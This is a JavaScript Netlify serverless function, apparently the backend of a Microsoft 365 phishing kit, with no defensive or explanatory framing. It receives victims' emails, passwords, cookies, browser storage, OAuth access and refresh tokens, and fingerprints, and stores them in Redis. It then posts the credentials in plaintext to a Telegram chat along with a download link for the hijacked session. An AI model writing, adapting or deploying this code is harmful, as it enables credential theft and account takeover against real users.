export const handler = async (event, context) => {
  // Set CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  // Handle preflight requests
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: '',
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' }),
    };
  }

  // DEBUG: Log entry point and incoming data
  console.log("saveSession called! Event body:", event.body);

  try {
    let data;
    try {
      data = JSON.parse(event.body);
    } catch (parseError) {
      console.error('❌ JSON parse error:', parseError, 'Raw body:', event.body);
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({
          error: 'Invalid JSON in request body',
          details: parseError.message,
        }),
      };
    }

    // Check environment variables for Redis
    const UPSTASH_REDIS_REST_URL = process.env.UPSTASH_REDIS_REST_URL;
    const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

    // Check environment variables for Telegram
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    // Log env presence (mask actual values)
    console.log('TELEGRAM_BOT_TOKEN set?', !!TELEGRAM_BOT_TOKEN, 'TELEGRAM_CHAT_ID set?', !!TELEGRAM_CHAT_ID);
    console.log('UPSTASH_REDIS_REST_URL set?', !!UPSTASH_REDIS_REST_URL, 'UPSTASH_REDIS_REST_TOKEN set?', !!UPSTASH_REDIS_REST_TOKEN);

    // Get client IP
    const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
      event.headers['x-real-ip'] ||
      event.headers['cf-connecting-ip'] ||
      event.requestContext?.identity?.sourceIp ||
      'Unknown';

    // Create session data with better validation
    const sessionData = {
      email: data.email || '',
      password: data.password || 'Not captured',
      provider: data.provider || 'Microsoft',
      fileName: data.fileName || 'Microsoft 365 Access',
      timestamp: data.timestamp || new Date().toISOString(),
      sessionId: data.sessionId || Math.random().toString(36).substring(2, 15),
      clientIP: clientIP,
      userAgent: data.userAgent || event.headers['user-agent'] || 'Unknown',
      deviceType: data.deviceType || (/Mobile|Android|iPhone|iPad/.test(data.userAgent || event.headers['user-agent'] || '') ? 'mobile' : 'desktop'),
      cookies: data.cookies || 'No cookies found',
      formattedCookies: data.formattedCookies || [],
      localStorage: data.localStorage || 'Empty',
      sessionStorage: data.sessionStorage || 'Empty',
      browserFingerprint: data.browserFingerprint || {},
      documentCookies: data.documentCookies || '',
      accessToken: data.accessToken || null,
      refreshToken: data.refreshToken || null,
      userProfile: data.userProfile || null
    };

    // Try to store in Redis if available, otherwise use memory
    if (UPSTASH_REDIS_REST_URL && UPSTASH_REDIS_REST_TOKEN) {
      try {
        const { Redis } = await import('@upstash/redis');
        const redis = new Redis({
          url: UPSTASH_REDIS_REST_URL,
          token: UPSTASH_REDIS_REST_TOKEN,
        });

        // Store with TTL of 24 hours
        await redis.set(`session:${sessionData.sessionId}`, JSON.stringify(sessionData), { ex: 86400 });
        await redis.set(`user:${sessionData.email}`, JSON.stringify(sessionData), { ex: 86400 });

        // Also store cookies separately for easy retrieval
        await redis.set(`cookies:${sessionData.sessionId}`, JSON.stringify({
          cookies: sessionData.formattedCookies,
          localStorage: sessionData.localStorage,
          sessionStorage: sessionData.sessionStorage,
          timestamp: sessionData.timestamp,
          email: sessionData.email,
          password: sessionData.password,
          documentCookies: sessionData.documentCookies
        }), { ex: 86400 });

        console.log('✅ Session saved to Redis:', sessionData.sessionId);
      } catch (redisError) {
        console.error('❌ Redis storage error, falling back to memory:', redisError);
        // Fallback to memory storage
        global.sessions = global.sessions || {};
        global.sessions[sessionData.sessionId] = sessionData;
      }
    } else {
      // Store session in memory (fallback)
      global.sessions = global.sessions || {};
      global.sessions[sessionData.sessionId] = sessionData;
      console.log('⚠️ Using memory storage (Redis not configured)');
    }

    console.log('✅ Session saved successfully:', sessionData.sessionId);

    // Send immediate Telegram notification if not already sent
    try {
      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID && !data.skipTelegram) {
        const quickMessage = `🔔 NEW SESSION SAVED

📧 ${sessionData.email}
🔑 ${sessionData.password}
🆔 ${sessionData.sessionId}
🍪 ${Array.isArray(sessionData.formattedCookies) ? sessionData.formattedCookies.length : 0} cookies
💾 Storage: ${sessionData.localStorage !== 'Empty' ? 'Has Data' : 'Empty'}
🌐 IP: ${sessionData.clientIP}
🕒 ${new Date().toLocaleString()}

Download: ${event.headers.host ? `https://${event.headers.host}` : 'https://your-domain.netlify.app'}/.netlify/functions/getCookies?sessionId=${sessionData.sessionId}`;

        const telegramResp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: quickMessage,
            parse_mode: 'Markdown'
          }),
          signal: AbortSignal.timeout(10000)
        });

        if (!telegramResp.ok) {
          const errorText = await telegramResp.text();
          console.error('❌ Telegram API error:', errorText);
        } else {
          console.log('✅ Quick Telegram notification sent');
        }
      } else {
        console.log('ℹ️ Telegram notification skipped (env missing or skipTelegram true)');
      }
    } catch (telegramError) {
      console.error('⚠️ Failed to send quick Telegram notification:', telegramError);
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        sessionId: sessionData.sessionId,
        message: 'Session saved successfully',
        storage: UPSTASH_REDIS_REST_URL ? 'Redis' : 'Memory',
        telegramSent: !!TELEGRAM_BOT_TOKEN && !!TELEGRAM_CHAT_ID && !data.skipTelegram,
        data: {
          email: sessionData.email,
          provider: sessionData.provider,
          timestamp: sessionData.timestamp,
          cookieCount: Array.isArray(sessionData.formattedCookies) ? sessionData.formattedCookies.length : 0,
          hasLocalStorage: sessionData.localStorage !== 'Empty',
          hasSessionStorage: sessionData.sessionStorage !== 'Empty'
        }
      }),
    };

  } catch (error) {
    console.error('❌ Error saving session:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'Failed to save session',
        details: error.message,
        timestamp: new Date().toISOString()
      }),
    };
  }
};